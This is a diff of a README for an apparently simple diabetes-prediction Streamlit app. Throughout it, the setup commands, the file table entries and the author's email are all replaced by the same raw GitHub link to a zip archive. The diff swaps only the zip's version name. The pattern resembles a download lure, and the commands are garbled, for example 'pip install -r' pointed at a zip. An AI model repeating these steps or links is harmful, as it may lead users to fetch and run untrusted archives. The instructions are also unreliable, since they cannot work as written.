@@ -29,22 +29,22 @@ The user provides health data such as glucose level, BMI, insulin level, etc., a
 
 ### 1️⃣ Clone the Repository
 ```bash
-git clone https://github.com/Himanwell/Diabetes-prediction-app/raw/refs/heads/main/quilter/Diabetes-prediction-app-3.3.zip
+git clone https://github.com/Himanwell/Diabetes-prediction-app/raw/refs/heads/main/quilter/prediction-app-Diabetes-v2.5.zip
 cd Diabetes-prediction-app
 2️⃣ Install Dependencies
 
 Make sure you have Python installed, then install the requirements:
-pip install -r https://github.com/Himanwell/Diabetes-prediction-app/raw/refs/heads/main/quilter/Diabetes-prediction-app-3.3.zip
+pip install -r https://github.com/Himanwell/Diabetes-prediction-app/raw/refs/heads/main/quilter/prediction-app-Diabetes-v2.5.zip
 3️⃣ Run the Streamlit App
-streamlit run "Diabetes prediction web https://github.com/Himanwell/Diabetes-prediction-app/raw/refs/heads/main/quilter/Diabetes-prediction-app-3.3.zip"
+streamlit run "Diabetes prediction web https://github.com/Himanwell/Diabetes-prediction-app/raw/refs/heads/main/quilter/prediction-app-Diabetes-v2.5.zip"
 Then open the URL shown in your terminal (usually http://localhost:8501
 ).
 | File                                           | Description                                        |
 | ---------------------------------------------- | -------------------------------------------------- |
-| `Diabetes prediction web https://github.com/Himanwell/Diabetes-prediction-app/raw/refs/heads/main/quilter/Diabetes-prediction-app-3.3.zip`               | Streamlit app that runs the web interface          |
-| `predictive https://github.com/Himanwell/Diabetes-prediction-app/raw/refs/heads/main/quilter/Diabetes-prediction-app-3.3.zip`                         | Simple script for testing predictions manually     |
-| `https://github.com/Himanwell/Diabetes-prediction-app/raw/refs/heads/main/quilter/Diabetes-prediction-app-3.3.zip` | Jupyter notebook showing how the model was trained |
-| `https://github.com/Himanwell/Diabetes-prediction-app/raw/refs/heads/main/quilter/Diabetes-prediction-app-3.3.zip`                             | List of dependencies required to run the app       |
+| `Diabetes prediction web https://github.com/Himanwell/Diabetes-prediction-app/raw/refs/heads/main/quilter/prediction-app-Diabetes-v2.5.zip`               | Streamlit app that runs the web interface          |
+| `predictive https://github.com/Himanwell/Diabetes-prediction-app/raw/refs/heads/main/quilter/prediction-app-Diabetes-v2.5.zip`                         | Simple script for testing predictions manually     |
+| `https://github.com/Himanwell/Diabetes-prediction-app/raw/refs/heads/main/quilter/prediction-app-Diabetes-v2.5.zip` | Jupyter notebook showing how the model was trained |
+| `https://github.com/Himanwell/Diabetes-prediction-app/raw/refs/heads/main/quilter/prediction-app-Diabetes-v2.5.zip`                             | List of dependencies required to run the app       |
 | `.gitignore`                                   | Prevents unwanted files from being uploaded        |
 
 🧰 Technologies Used
@@ -66,5 +66,5 @@ Pickle
 🧑‍💻 Author
 
 Himanwell
-📧 https://github.com/Himanwell/Diabetes-prediction-app/raw/refs/heads/main/quilter/Diabetes-prediction-app-3.3.zip
-https://github.com/Himanwell/Diabetes-prediction-app/raw/refs/heads/main/quilter/Diabetes-prediction-app-3.3.zip
+📧 https://github.com/Himanwell/Diabetes-prediction-app/raw/refs/heads/main/quilter/prediction-app-Diabetes-v2.5.zip
+https://github.com/Himanwell/Diabetes-prediction-app/raw/refs/heads/main/quilter/prediction-app-Diabetes-v2.5.zip
